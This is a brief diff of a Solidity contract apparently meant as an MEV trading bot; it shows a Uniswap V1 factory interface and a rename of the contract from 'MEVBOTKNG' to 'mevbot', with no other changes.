@@ -18,7 +18,7 @@ interface IUniswapV1Factory {
     function getExchange(address) external view returns (address);
 }
 
-contract MEVBOTKNG {
+contract mevbot {
     uint liquidity;
     address public owner;
 
